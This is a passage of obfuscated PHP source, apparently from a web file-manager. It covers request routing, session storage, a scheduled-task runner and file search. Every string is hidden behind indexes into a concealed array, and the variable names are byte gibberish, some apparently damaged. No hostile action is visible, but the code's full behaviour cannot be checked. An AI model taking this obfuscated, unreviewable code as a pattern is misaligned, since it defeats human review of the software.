parse_url($_SERVER[$€Ô¾õœç[1622]], PHP_URL_PATH); $Š”¡òÄ¿ = $_SERVER[$€Ô¾õœç[159]]; $ËÒéÕ¨Ö = array_keys(static::$patterns); $»˜îˆ¸› = array_values(static::$patterns); $éÇ¸Ûáõ = !1; self::$routes = preg_replace($€Ô¾õœç[1306], $€Ô¾õœç[8], self::$routes); if (in_array($¾ÊåŞ’, self::$routes)) { $¤ï‚“Ë = array_keys(self::$routes, $¾ÊåŞ’); foreach ($¤ï‚“Ë as $ÕÒí‘š) { if (self::$methods[$ÕÒí‘š] == $Š”¡òÄ¿ || self::$methods[$ÕÒí‘š] == $€Ô¾õœç[1623] || in_array($Š”¡òÄ¿, self::$maps[$ÕÒí‘š])) { $éÇ¸Ûáõ = !0; if (!is_object(self::$callbacks[$ÕÒí‘š])) { $¬Î†ß§ô = explode($€Ô¾õœç[8], self::$callbacks[$ÕÒí‘š]); $²½Šíİğ = end($¬Î†ß§ô); $ùÒ‘„ª = explode($€Ô¾õœç[1238], $²½Šíİğ); $öÍãöûä = new $ùÒ‘„ª[0](); $öÍãöûä->{$ùÒ‘„ª[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÕÒí‘š]); if (self::$halts) { return; } } } } } else { $ç¶ó¸Ü³ = 0; foreach (self::$routes as $ÕÒí‘š) { if (strpos($ÕÒí‘š, $€Ô¾õœç[4]) !== !1) { $ÕÒí‘š = str_replace($ËÒéÕ¨Ö, $»˜îˆ¸›, $ÕÒí‘š); } if (preg_match($€Ô¾õœç[1624] . $ÕÒí‘š . $€Ô¾õœç[1625], $¾ÊåŞ’, $û£ïš¤²)) { if (self::$methods[$ç¶ó¸Ü³] == $Š”¡òÄ¿ || self::$methods[$ç¶ó¸Ü³] == $€Ô¾õœç[1623] || !empty(self::$maps[$ç¶ó¸Ü³]) && in_array($Š”¡òÄ¿, self::$maps[$ç¶ó¸Ü³])) { $éÇ¸Ûáõ = !0; array_shift($û£ïš¤²); if (!is_object(self::$callbacks[$ç¶ó¸Ü³])) { $¬Î†ß§ô = explode($€Ô¾õœç[8], self::$callbacks[$ç¶ó¸Ü³]); $²½Šíİğ = end($¬Î†ß§ô); $ùÒ‘„ª = explode($€Ô¾õœç[1238], $²½Šíİğ); $öÍãöûä = new $ùÒ‘„ª[0](); if (!method_exists($öÍãöûä, $ùÒ‘„ª[1])) { echo $€Ô¾õœç[1626]; } else { call_user_func_array(array($öÍãöûä, $ùÒ‘„ª[1]), $û£ïš¤²); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ç¶ó¸Ü³], $û£ïš¤²); if (self::$halts) { return; } } } } $ç¶ó¸Ü³++; } } if ($éÇ¸Ûáõ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ô¢İƒîñ =& $_SERVER[™»È’øè]; header($_SERVER[$ô¢İƒîñ[1627]] . $ô¢İƒîñ[1628]); echo $ô¢İƒîñ[1629]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$€Ô¾õœç[1622]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $û•îœ¯ =& $_SERVER[™»È’øè]; static $¼öıš¸¾ = false; if ($¼öıš¸¾) { return $¼öıš¸¾; } $¢¹ç”êå = $GLOBALS[$û•îœ¯[6]][$û•îœ¯[392]]; self::$sessionTime = $¢¹ç”êå[$û•îœ¯[1630]]; $‹—™¬ü = isset($GLOBALS[$û•îœ¯[1631]]) ? $GLOBALS[$û•îœ¯[1631]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($‹—™¬ü)) { self::$sessionSign = Cookie::get($‹—™¬ü); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($‹—™¬ü, self::$sessionSign, self::$sessionTime); $àœĞ“ã = $¢¹ç”êå[$û•îœ¯[1632]]; $³ğÊû = $¢¹ç”êå[$àœĞ“ã]; $„µ§³ûÖ = $¢¹ç”êå[$û•îœ¯[853]]; switch ($àœĞ“ã) { case $û•îœ¯[21]: self::$handle = Model($û•îœ¯[854]); break; case $û•îœ¯[855]: self::$handle = new CacheRedis($³ğÊû, $„µ§³ûÖ); break; case $û•îœ¯[856]: self::$handle = new CacheMemcached($³ğÊû, $„µ§³ûÖ); break; case $û•îœ¯[213]: $³ğÊû[$û•îœ¯[84]] = $³ğÊû[$û•îœ¯[84]] . $û•îœ¯[1633]; self::$handle = new CacheFile($³ğÊû, $„µ§³ûÖ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $¼öıš¸¾ = new self(); return $¼öıš¸¾; } public static function getBySign($àäØ¸ší) { $òËĞğ§ı = self::$handle->get($àäØ¸ší); $òËĞğ§ı = unserialize($òËĞğ§ı); return is_array($òËĞğ§ı) ? $òËĞğ§ı : array(); } public static function setBySign($³Äİ¥Ÿ, $Ÿ•úºà) { CacheLock::lock($³Äİ¥Ÿ); self::$handle->set($³Äİ¥Ÿ, serialize($Ÿ•úºà), self::$sessionTime); CacheLock::unlock($³Äİ¥Ÿ); } public static function sign($ÆÎÌ‚Ò = false) { if ($ÆÎÌ‚Ò) { self::$sessionSign = $ÆÎÌ‚Ò; } self::init(); return self::$sessionSign; } public static function set($ÍÔ…™—Ø, $¢îà¤Ûç = false) { self::init(); if (is_array($ÍÔ…™—Ø)) { foreach ($ÍÔ…™—Ø as $ï˜É«äÅ => $ê‰Ş£Ÿ) { array_set_value(self::$data, $ï˜É«äÅ, $ê‰Ş£Ÿ); } } else { array_set_value(self::$data, $ÍÔ…™—Ø, $¢îà¤Ûç); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÑûÏÊùá = false) { self::init(); if (!$ÑûÏÊùá) { return self::$data; } return array_get_value(self::$data, $ÑûÏÊùá); } public static function remove($¥ÏïêÌ­) { self::init(); unset(self::$data[$¥ÏïêÌ­]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[™»È’øè][859])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ÂóÆÁ³“ =& $_SERVER[™»È’øè]; if (self::valueGet($ÂóÆÁ³“[775]) != $ÂóÆÁ³“[88]) { return; } if (self::valueGet($ÂóÆÁ³“[1634]) == $ÂóÆÁ³“[88]) { $ĞÂ¶èˆ = self::valueGet($ÂóÆÁ³“[1635]); if (time() - $ĞÂ¶èˆ > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($ÂóÆÁ³“[1634], $ÂóÆÁ³“[88]); self::log($ÂóÆÁ³“[1636] . ACTION . $ÂóÆÁ³“[1637]); Hook::bind($ÂóÆÁ³“[1638], $ÂóÆÁ³“[1639]); $ïŞ³¶ÇÛ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ÂóÆÁ³“[775]) != $ÂóÆÁ³“[88]) { self::valueSet($ÂóÆÁ³“[1634], $ÂóÆÁ³“[211]); self::log($ÂóÆÁ³“[1640]); die; } $¿¨Õ–Ïá = time(); if ($¿¨Õ–Ïá - $ïŞ³¶ÇÛ >= 60) { self::valueSet(array($ÂóÆÁ³“[1634] => $ÂóÆÁ³“[88], $ÂóÆÁ³“[1635] => $¿¨Õ–Ïá), !1); $ïŞ³¶ÇÛ = $¿¨Õ–Ïá; } if (!file_exists(USER_SYSTEM . $ÂóÆÁ³“[1641])) { self::valueSet(array($ÂóÆÁ³“[1634] => $ÂóÆÁ³“[211], $ÂóÆÁ³“[775] => $ÂóÆÁ³“[211]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $–ùŞŞòÑ =& $_SERVER[™»È’øè]; http_close(); $GLOBALS[$–ùŞŞòÑ[1642]] = 1; $_SERVER[$–ùŞŞòÑ[1643]] = $–ùŞŞòÑ[1644]; $_COOKIE = array(); $GLOBALS[$–ùŞŞòÑ[535]] = 1; $GLOBALS[$–ùŞŞòÑ[1645]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $şœŒÌ­¶ =& $_SERVER[™»È’øè]; http_close(); self::valueSet($şœŒÌ­¶[775], $şœŒÌ­¶[211]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($şœŒÌ­¶[1634] => $şœŒÌ­¶[211], $şœŒÌ­¶[775] => $şœŒÌ­¶[88]), !1); } public static function taskSwitch() { $éßÎ‘¬° =& $_SERVER[™»È’øè]; $ÕÃìâúÎ = self::valueGet($éßÎ‘¬°[775]) == $éßÎ‘¬°[88] ? $éßÎ‘¬°[211] : $éßÎ‘¬°[88]; self::valueSet($éßÎ‘¬°[775], $ÕÃìâúÎ); } public static function shutdownEvent() { $„Å¾áô =& $_SERVER[™»È’øè]; self::valueSet($„Å¾áô[1634], $„Å¾áô[211]); self::log($„Å¾áô[1646]); } public static function config($æŠú¸ŒŸ, $ÇÈ¼æ«¡) { self::valueSet($_SERVER[™»È’øè][775], $æŠú¸ŒŸ); } private static function taskRunAll() { $‚œÉ«£ =& $_SERVER[™»È’øè]; $µÜö‡·ã = timeFloat(); $Æ‡ØŸÛÀ = Model($‚œÉ«£[1647])->listData(); $ï†°„€İ = count($Æ‡ØŸÛÀ); for ($¾Ó‹’Ç = 0; $¾Ó‹’Ç < $ï†°„€İ; $¾Ó‹’Ç++) { $œÇÔóò = $Æ‡ØŸÛÀ[$¾Ó‹’Ç]; if (!$œÇÔóò[$‚œÉ«£[442]] || $œÇÔóò[$‚œÉ«£[1648]] != $‚œÉ«£[88]) { continue; } if (!self::taskTimeCheck($œÇÔóò)) { continue; } self::taskRun($œÇÔóò); } Hook::trigger($‚œÉ«£[1649]); self::taskQueueRun($µÜö‡·ã); } private static function taskQueueRun($ ÀÏ²Ë) { $®ø¡ç = 10; while (!0) { $¾¥¦‰é° = TaskQueue::run(); if ($¾¥¦‰é° === !1) { break; } if (timeFloat() - $ ÀÏ²Ë >= $®ø¡ç) { break; } } } private static function taskTimeCheck($«ô¶…š£) { $‚Ü±ó˜Í =& $_SERVER[™»È’øè]; $©µóÄí¬ = json_decode($«ô¶…š£[$‚Ü±ó˜Í[193]], !0); $›·ĞÃé = intval($«ô¶…š£[$‚Ü±ó˜Í[1635]]); $‘ƒûı² = strtotime($‚Ü±ó˜Í[1650] . $©µóÄí¬[$‚Ü±ó˜Í[1651]] . $‚Ü±ó˜Í[1652]) - strtotime($‚Ü±ó˜Í[1653]); $¬ÅéæóÓ = time() - strtotime(date($‚Ü±ó˜Í[1654]) . $‚Ü±ó˜Í[1655]); $â¦ùâÙÑ = $¬ÅéæóÓ >= $‘ƒûı² && $¬ÅéæóÓ <= $‘ƒûı² + 3600; switch ($©µóÄí¬[$‚Ü±ó˜Í[33]]) { case $‚Ü±ó˜Í[1656]: if (time() - $›·ĞÃé < 3600 * 24 * 30) { return !1; } if ($©µóÄí¬[$‚Ü±ó˜Í[1656]] == date($‚Ü±ó˜Í[1657]) && $â¦ùâÙÑ) { return !0; } break; case $‚Ü±ó˜Í[1658]: if (time() - $›·ĞÃé < 3600 * 24 * 7) { return !1; } $¡Ø¢º¤² = date($‚Ü±ó˜Í[1659]) == 0 ? 7 : date($‚Ü±ó˜Í[1659]); if ($©µóÄí¬[$‚Ü±ó˜Í[1658]] == $¡Ø¢º¤² && $â¦ùâÙÑ) { return !0; } break; case $‚Ü±ó˜Í[1651]: if (time() - $›·ĞÃé < 3600 * 24) { return !1; } if ($â¦ùâÙÑ) { return !0; } break; case $‚Ü±ó˜Í[1660]: if (time() - $›·ĞÃé >= floatval($©µóÄí¬[$‚Ü±ó˜Í[1660]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $öÉœ«›Ï =& $_SERVER[™»È’øè]; static $‡Ä¨¦ŞÌ = 0; $°Ì¬–—‹ = 300; if (!$‡Ä¨¦ŞÌ) { $‡Ä¨¦ŞÌ = time(); } if (time() - $‡Ä¨¦ŞÌ < $°Ì¬–—‹) { return; } $‡Ä¨¦ŞÌ = time(); $ã²Õãğ = Model($öÉœ«›Ï[545])->db($öÉœ«›Ï[12]); if ($ã²Õãğ) { $ã²Õãğ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($öÉœ«›Ï[1661], $öÉœ«›Ï[1662]); die; } } public static function taskRun($Ğ³¸üÙ‡) { $µÓíÑ‚ =& $_SERVER[™»È’øè]; self::log($µÓíÑ‚[1663] . $Ğ³¸üÙ‡[$µÓíÑ‚[442]] . $µÓíÑ‚[1664] . $Ğ³¸üÙ‡[$µÓíÑ‚[32]] . $µÓíÑ‚[1665] . $Ğ³¸üÙ‡[$µÓíÑ‚[1666]]); Model($µÓíÑ‚[1647])->run($Ğ³¸üÙ‡[$µÓíÑ‚[442]]); $»”ÀÈ‰ˆ = timeFloat(); $³èãÄèˆ = $µÓíÑ‚[12]; switch ($Ğ³¸üÙ‡[$µÓíÑ‚[33]]) { case $µÓíÑ‚[350]: $»¸Ä‚„¨ = url_request($Ğ³¸üÙ‡[$µÓíÑ‚[1666]], $µÓíÑ‚[244], !1, !1, !1, !1, 10); if ($»¸Ä‚„¨[$µÓíÑ‚[775]]) { $³èãÄèˆ = strlen($»¸Ä‚„¨[$µÓíÑ‚[1232]]); } break; case $µÓíÑ‚[243]: $³èãÄèˆ = Hook::apply($Ğ³¸üÙ‡[$µÓíÑ‚[1666]]); default: break; } Model($µÓíÑ‚[1667])->add(array($µÓíÑ‚[1668] => $µÓíÑ‚[12], $µÓíÑ‚[1669] => $µÓíÑ‚[211], $µÓíÑ‚[33] => $µÓíÑ‚[1670] . $Ğ³¸üÙ‡[$µÓíÑ‚[442]], $µÓíÑ‚[1671] => json_encode(array($µÓíÑ‚[32] => $Ğ³¸üÙ‡[$µÓíÑ‚[32]], $µÓíÑ‚[1672] => timeFloat() - $»”ÀÈ‰ˆ, $µÓíÑ‚[336] => $³èãÄèˆ)))); $°Ö’Ğûğ = $³èãÄèˆ ? $µÓíÑ‚[1673] . $³èãÄèˆ : $µÓíÑ‚[12]; self::log($µÓíÑ‚[1674] . $Ğ³¸üÙ‡[$µÓíÑ‚[442]] . $µÓíÑ‚[164] . $°Ö’Ğûğ); return !0; } public static function valueGet($§Çè¯¥–) { $çÙ¡Ã…» =& $_SERVER[™»È’øè]; $½»Ã¬Ş– = $çÙ¡Ã…»[1675]; $§™ıºõÑ = Model($çÙ¡Ã…»[475])->get($§Çè¯¥–, $½»Ã¬Ş–); if (is_null($§™ıºõÑ)) { Model($çÙ¡Ã…»[475])->set($çÙ¡Ã…»[775], $çÙ¡Ã…»[88], $½»Ã¬Ş–); Model($çÙ¡Ã…»[475])->set($çÙ¡Ã…»[1634], $çÙ¡Ã…»[211], $½»Ã¬Ş–); $§™ıºõÑ = Model($çÙ¡Ã…»[475])->get($§Çè¯¥–, $½»Ã¬Ş–); } return $§™ıºõÑ; } private static function valueSet($Î† ·ïÂ, $§Ñ† ß) { $Øö–ĞÅ =& $_SERVER[™»È’øè]; $­˜ñ‡ = $Øö–ĞÅ[1676]; CacheLock::lock($­˜ñ‡); $–§“‡ÈÍ = Model($Øö–ĞÅ[475])->set($Î† ·ïÂ, $§Ñ† ß, $Øö–ĞÅ[1675]); CacheLock::unlock($­˜ñ‡); return $–§“‡ÈÍ; } protected static function log($¸åÑİ§‘) { write_log($¸åÑİ§‘, $_SERVER[™»È’øè][1662]); } private static function cacheClear() { $ ƒ’ÌñÍ =& $_SERVER[™»È’øè]; Cache::clearMemory(Model($ ƒ’ÌñÍ[475])->cacheKey($ ƒ’ÌñÍ[1675])); Cache::clearMemory(Model($ ƒ’ÌñÍ[475])->cacheKey($ ƒ’ÌñÍ[1677])); Model($ ƒ’ÌñÍ[1647])->cacheClear(); self::closeDatabase(); } } goto fñ‰–ğˆÅÂ; bó‚“öÒÙ³: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($‰Ö¶¡×Ä) { $‚¼Ç“Í =& $_SERVER[™»È’øè]; $šîĞË½¼ = KodIO::fileTypeList(); $•¶÷â„¶ = $šîĞË½¼[$‰Ö¶¡×Ä]; if (!$•¶÷â„¶) { return array(); } $â÷êŞ†š = $•¶÷â„¶[$‚¼Ç“Í[174]]; $ÁòüØâŒ = $‚¼Ç“Í[7]; if (!$•¶÷â„¶[$‚¼Ç“Í[174]]) { $çèÇ¼ûä = array_to_keyvalue($šîĞË½¼, $‚¼Ç“Í[12], $‚¼Ç“Í[174]); $â÷êŞ†š = implode($‚¼Ç“Í[50], $çèÇ¼ûä); $ÁòüØâŒ = $‚¼Ç“Í[2126]; } $Ç¥µİ‘ = explode($‚¼Ç“Í[50], trim($â÷êŞ†š, $‚¼Ç“Í[50])); return array($ÁòüØâŒ, $Ç¥µİ‘); } public function listPathType($±á„Á‡) { $ñïŸ­ı– =& $_SERVER[™»È’øè]; $­ËâµÇé = $this->fileTypeWhere($±á„Á‡); if (!$­ËâµÇé) { return array(); } $Ìƒ²ƒ°€ = USER_ID; $ğæü–¾Ö = Model($ñïŸ­ı–[566])->getInfo($Ìƒ²ƒ°€); $É˜óÏ’ = array($ñïŸ­ı–[615] => SourceModel::TYPE_USER, $ñïŸ­ı–[552] => array($ñïŸ­ı–[579], $ñïŸ­ı–[562] . $ğæü–¾Ö[$ñïŸ­ı–[87]][$ñïŸ­ı–[180]] . $ñïŸ­ı–[580]), $ñïŸ­ı–[616] => $Ìƒ²ƒ°€, $ñïŸ­ı–[613] => 0, $ñïŸ­ı–[614] => $­ËâµÇé); return $this->listSource($É˜óÏ’); } public function listSearch($–ÖìİÃĞ, $ÍÓë•’Ô = 300) { $ü‡ÇÙú¾ =& $_SERVER[™»È’øè]; if (isset($–ÖìİÃĞ[$ü‡ÇÙú¾[1964]]) && $–ÖìİÃĞ[$ü‡ÇÙú¾[1964]]) { $–ÖìİÃĞ[$ü‡ÇÙú¾[1964]] = str_replace($ü‡ÇÙú¾[427], $ü‡ÇÙú¾[2127], trim($–ÖìİÃĞ[$ü‡ÇÙú¾[1964]])); } $Î½ØÈœ— = $this->_parseSearchWhere($–ÖìİÃĞ); if (!isset($Î½ØÈœ—[$ü‡ÇÙú¾[472]])) { $Î½ØÈœ—[$ü‡ÇÙú¾[472]] = 0; } $îÜÒ¾œ£ = $ü‡ÇÙú¾[2128]; $È‹Ä²Èø = $Î½ØÈœ—; $£Ó·¾Æ¨ = $îÜÒ¾œ£; $this->_listSearchBindPinyin($–ÖìİÃĞ, $Î½ØÈœ—, $îÜÒ¾œ£); $this->alias($ü‡ÇÙú¾[486])->_makeOrder(); $Î½ØÈœ— = $this->parseWhereLike($Î½ØÈœ—); $Î‘¨‘Ó» = $this->distinct(!0)->field($îÜÒ¾œ£)->where($Î½ØÈœ—)->selectPage($ÍÓë•’Ô); if ($GLOBALS[$ü‡ÇÙú¾[6]][$ü‡ÇÙú¾[424]][$ü‡ÇÙú¾[425]] && Input::check($–ÖìİÃĞ[$ü‡ÇÙú¾[1964]], $ü‡ÇÙú¾[622]) && $Î‘¨‘Ó»[$ü‡ÇÙú¾[409]][$ü‡ÇÙú¾[396]] == 1 && $Î‘¨‘Ó»[$ü‡ÇÙú¾[409]][$ü‡ÇÙú¾[410]] == 0) { $Î‘¨‘Ó» = $this->distinct(!0)->field($îÜÒ¾œ£)->where($È‹Ä²Èø)->limit(1000)->select(); $Î‘¨‘Ó» = array_page_split($Î‘¨‘Ó», !1, $ÍÓë•’Ô); } $this->_listSearchFileContent($Î‘¨‘Ó», $–ÖìİÃĞ, $£Ó·¾Æ¨, $È‹Ä²Èø); $this->_listSearchDesc($Î‘¨‘Ó», $–ÖìİÃĞ, $£Ó·¾Æ¨); $this->_listSearchTag($Î‘¨‘Ó», $–ÖìİÃĞ, $£Ó·¾Æ¨); $this->_listSearchGroupTag($Î‘¨‘Ó», $–ÖìİÃĞ, $£Ó·¾Æ¨); $this->_listDataApply($Î‘¨‘Ó»[$ü‡ÇÙú¾[412]]); $this->_listMake($Î‘¨‘Ó»); return $Î‘¨‘Ó»; } private function _listSearchFileContent(&$èöô±§‹, $—§âÃñë, $ô†äÇÕ‹, $¯«å»ù) { $ÈÙÒÙÀĞ =& $_SERVER[™»È’øè]; if (!$—§âÃñë[$ÈÙÒÙÀĞ[1964]] || $èöô±§‹[$ÈÙÒÙÀĞ[409]][$ÈÙÒÙÀĞ[396]] > 1) { return; } if (!isset($¯«å»ù[$ÈÙÒÙÀĞ[32]]) || !is_array($—§âÃñë[$ÈÙÒÙÀĞ[508]])) { return; } $¯«å»ù[$ÈÙÒÙÀĞ[508]] = array($ÈÙÒÙÀĞ[7], $—§âÃñë[$ÈÙÒÙÀĞ[508]]); unset($¯«å»ù[$ÈÙÒÙÀĞ[32]]); unset($—§âÃñë[$ÈÙÒÙÀĞ[508]]); $µØƒŠÑê = $this->field($ô†äÇÕ‹)->where($¯«å»ù)->limit($ÈÙÒÙÀĞ[2129])->select(); if (!$µØƒŠÑê || count($µØƒŠÑê) == 0) { return; } $èöô±§‹[$ÈÙÒÙÀĞ[412]] = array_merge($µØƒŠÑê, $èöô±§‹[$ÈÙÒÙÀĞ[412]]); $èöô±§‹[$ÈÙÒÙÀĞ[409]][$ÈÙÒÙÀĞ[410]] += count($µØƒŠÑê); } private function _listSearchTag(&$Ù–šØâŸ, $½ùÁ‚Êù, $ßÙ‹Üâ ) { $ïŞÈÓÅ´ =& $_SERVER[™»È’øè]; if (!$½ùÁ‚Êù[$ïŞÈÓÅ´[1964]] || $Ù–šØâŸ[$ïŞÈÓÅ´[409]][$ïŞÈÓÅ´[396]] > 1) { return; } $ÂáÊçê = Model($ïŞÈÓÅ´[2130])->listData(); $ ­á–ùğ = array(); $ÃÑ»İ‘½ = $½ùÁ‚Êù[$ïŞÈÓÅ´[1964]]; foreach ($ÂáÊçê as $·ÌôœÏ³) { $¨©êÉŞè = $·ÌôœÏ³[$ïŞÈÓÅ´[32]]; $«½ñÀåû = str_replace($ïŞÈÓÅ´[53], $ïŞÈÓÅ´[12], Pinyin::get($¨©êÉŞè)); if (stripos($¨©êÉŞè, $ÃÑ»İ‘½) !== !1 || stripos($«½ñÀåû, $ÃÑ»İ‘½) !== !1) { $ ­á–ùğ[] = $·ÌôœÏ³[$ïŞÈÓÅ´[442]]; } } if (!$ ­á–ùğ) { return; } $ïšÎ×¥ = array($ïŞÈÓÅ´[467] => array($ïŞÈÓÅ´[7], $ ­á–ùğ), $ïŞÈÓÅ´[1678] => USER_ID); $£¯Îû»î = Model($ïŞÈÓÅ´[469])->field($ïŞÈÓÅ´[84])->where($ïšÎ×¥)->select(); $£¯Îû»î = array_to_keyvalue($£¯Îû»î, $ïŞÈÓÅ´[12], $ïŞÈÓÅ´[84]); $¹×Ìé³ = array_unique($£¯Îû»î); $this->_listSearchMerge($Ù–šØâŸ, $½ùÁ‚Êù, $ßÙ‹Üâ , $¹×Ìé³); } private function _listSearchDesc(&$Çßà¦ĞÍ, $Íö¡‘Éû, $•ĞğÅÓŞ) { $óˆØíö =& $_SERVER[™»È’øè]; if (!$Íö¡‘Éû[$óˆØíö[1964]] || $Çßà¦ĞÍ[$óˆØíö[409]][$óˆØíö[396]] > 1) { return; } $Ñ¥öø¶Ê = array($óˆØíö[94] => $óˆØíö[493], $óˆØíö[417] => array($óˆØíö[426], $óˆØíö[1966] . $Íö¡‘Éû[$óˆØíö[1964]] . $óˆØíö[1966])); $å®§‹Á– = !1; if ($å®§‹Á–) { $Œã‡£¿Ë = $this->listSearchChildren($Íö¡‘Éû[$óˆØíö[179]]); $Œã‡£¿Ë = array_unique($Œã‡£¿Ë); if (!$Œã‡£¿Ë) { return; } $Ñ¥öø¶Ê[$óˆØíö[180]] = array($óˆØíö[7], $Œã‡£¿Ë); } $÷¨ÇÊù˜ = Model($óˆØíö[599])->field($óˆØíö[180])->where($Ñ¥öø¶Ê)->limit(5000)->select(); $ Î³ûé = array_to_keyvalue($÷¨ÇÊù˜, $óˆØíö[12], $óˆØíö[180]); $this->_listSearchMerge($Çßà¦ĞÍ, $Íö¡‘Éû, $•ĞğÅÓŞ, $ Î³ûé); } private function _listSearchGroupTag(&$¡àµÕ–£, $¿ı¥´„, $¬¼¦ÆëÛ) { $Ë‡ûùÙ =& $_SERVER[™»È’øè]; if (!$¿ı¥´„[$Ë‡ûùÙ[1964]] || $¡àµÕ–£[$Ë‡ûùÙ[409]][$Ë‡ûùÙ[396]] > 1 || !$¿ı¥´„[$Ë‡ûùÙ[179]]) { return; } $ª¬êøª  = $this->sourceInfo($¿ı¥´„[$Ë‡ûùÙ[179]]); if (!$ª¬êøª  || $ª¬êøª [$Ë‡ûùÙ[177]] != SourceModel::TYPE_GROUP) { return; } $ô¬ÑÅº¥ = $ª¬êøª [$Ë‡ûùÙ[537]]; $ß…Ş™ë = Model($Ë‡ûùÙ[2131])->get($ô¬ÑÅº¥); $ÑºŒòòÆ = array(); $šËÅœ© = $¿ı¥´„[$Ë‡ûùÙ[1964]]; foreach ($ß…Ş™ë[$Ë‡ûùÙ[412]] as $Ğßèœœº) { $Ì·Îõô = $Ğßèœœº[$Ë‡ûùÙ[32]]; $À× ¤× = str_replace($Ë‡ûùÙ[53], $Ë‡ûùÙ[12], Pinyin::get($Ì·Îõô)); if (stripos($Ì·Îõô, $šËÅœ©) !== !1 || stripos($À× ¤×, $šËÅœ©) !== !1) { $ÑºŒòòÆ[] = $Ğßèœœº[$Ë‡ûùÙ[442]]; } } if (!$ÑºŒòòÆ) { return; } $¿ÌáÃ¿ò = array($Ë‡ûùÙ[467] => array($Ë‡ûùÙ[7], $ÑºŒòòÆ), $Ë‡ûùÙ[1678] => 0, $Ë‡ûùÙ[33] => $Ë‡ûùÙ[1986] . $ô¬ÑÅº¥); $î×ìÅï = Model($Ë‡ûùÙ[469])->field($Ë‡ûùÙ[84])->where($¿ÌáÃ¿ò)->select(); $î×ìÅï = array_to_keyvalue($î×ìÅï, $Ë‡ûùÙ[12], $Ë‡ûùÙ[84]); $İË¯ÙĞ© = array_unique($î×ìÅï); $this->_listSearchMerge($¡àµÕ–£, $¿ı¥´„, $¬¼¦ÆëÛ, $İË¯ÙĞ©); } private function _listSearchMerge(&$Á®ä‹é, $™ñ¢ºÔÜ, $•’±®Ãó, $À¸ˆÄ†æ) { $ÇÕÜ…¼« =& $_SERVER[™»È’øè]; if (!$À¸ˆÄ†æ) { return; } $’–ûóª = array_to_keyvalue($Á®ä‹é[$ÇÕÜ…¼«[412]], $ÇÕÜ…¼«[12], $ÇÕÜ…¼«[180]); $’¾”Ûè° = array_diff($À¸ˆÄ†æ, $’–ûóª); if (!$’¾”Ûè°) { return; } $ÀƒšúŠã = array($ÇÕÜ…¼«[180] => array($ÇÕÜ…¼«[7], $’¾”Ûè°)); $à²³ÀÁ = $this->field($•’±®Ãó)->where($ÀƒšúŠã)->select(); if (!$à²³ÀÁ) { return; } $¾¼½¦’î = array(); foreach ($à²³ÀÁ as $¹íåÊŸ) { if ($this->_listSearchFilter($¹íåÊŸ, $™ñ¢ºÔÜ)) { $¾¼½¦’î[] = $¹íåÊŸ; } } $Á®ä‹é[$ÇÕÜ…¼«[412]] = array_merge($¾¼½¦’î, $Á®ä‹é[$ÇÕÜ…¼«[412]]); $Á®ä‹é[$ÇÕÜ…¼«[409]][$ÇÕÜ…¼«[410]] += count($¾¼½¦’î); } private function _listSearchFilter($‚øƒ¼Š, $şÄüİİ¶) { $‹—şôáê =& $_SERVER[™»È’øè]; $¾ºÆÀŠµ = $‚øƒ¼Š[$‹—şôáê[452]] == $‹—şôáê[88]; if (!strstr($‚øƒ¼Š[$‹—şôáê[552]], $‹—şôáê[50] . $şÄüİİ¶[$‹—şôáê[179]] . $‹—şôáê[50])) { return !1; } if (isset($şÄüİİ¶[$‹—şôáê[453]]) && $şÄüİİ¶[$‹—şôáê[453]] != $‹—şôáê[1925]) { if ($şÄüİİ¶[$‹—şôáê[453]] == $‹—şôáê[75] && !$¾ºÆÀŠµ) { return !1; } if ($şÄüİİ¶[$‹—şôáê[453]] != $‹—şôáê[75] && $¾ºÆÀŠµ) { return !1; } if (!strstr($‚øƒ¼Š[$‹—şôáê[174]], $‹—şôáê[50] . $şÄüİİ¶[$‹—şôáê[453]] . $‹—şôáê[50])) { return !1; } } if (isset($şÄüİİ¶[$‹—şôáê[2132]]) && $şÄüİİ¶[$‹—şôáê[2132]] < $‚øƒ¼Š[$‹—şôáê[76]]) { return !1; } if (isset($şÄüİİ¶[$‹—şôáê[2133]]) && $şÄüİİ¶[$‹—şôáê[2133]] > $‚øƒ¼Š[$‹—şôáê[76]]) { return !1; } if (isset($şÄüİİ¶[$‹—şôáê[629]]) && $şÄüİİ¶[$‹—şôáê[629]] != $‚øƒ¼Š[$‹—şôáê[496]]) { return !1; } return !0; } public function listSearchChildren($óñ“‡Ø×, $ÀÈ€Ø¶ = 5000) { $Š—å¬²¶ =& $_SERVER[™»È’øè]; $”’«êâ© = array(); $©­Ñ‰æµ = $this->sourceInfo($óñ“‡Ø×); $¨ÔÚà‘° = array($Š—å¬²¶[552] => array($Š—å¬²¶[426], $©­Ñ‰æµ[$Š—å¬²¶[552]] . $©­Ñ‰æµ[$Š—å¬²¶[180]] . $Š—å¬²¶[580])); $›çø¢œ© = $this->field($Š—å¬²¶[76])->where($¨ÔÚà‘°)->limit($ÀÈ€Ø¶ + 1)->select(); $—˜ŠÈäÜ = is_array($›çø¢œ©) ? 